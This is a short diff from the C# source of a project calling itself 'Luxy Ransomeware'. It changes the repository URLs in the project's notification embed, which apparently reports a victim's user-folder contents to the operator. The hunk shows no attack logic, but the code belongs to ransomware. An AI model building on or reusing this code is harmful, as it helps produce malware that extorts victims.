@@ -77,15 +77,15 @@ User Folder:
     Movies:
 ```
 ".Trim(),
-                    url = "https://github.com/Ayuly3851/",
+                    url = "https://github.com/Ayuly3851/Luxy",
                     color = 34303,
                     footer = new FooterFormat
                     {
-                        text = $"Luxy Ransomeware {LuxyStub.Settings.Version} | https://github.com/Ayuly3851/"
+                        text = $"Luxy Ransomeware {LuxyStub.Settings.Version} | https://github.com/Ayuly3851/Luxy"
                     },
                     thumbnail = new ThumbnailFormat
                     {
-                        url = "https://github.com/Ayuly3851/"
+                        url = "https://github.com/Ayuly3851/Luxy"
                     }
                 }
             };
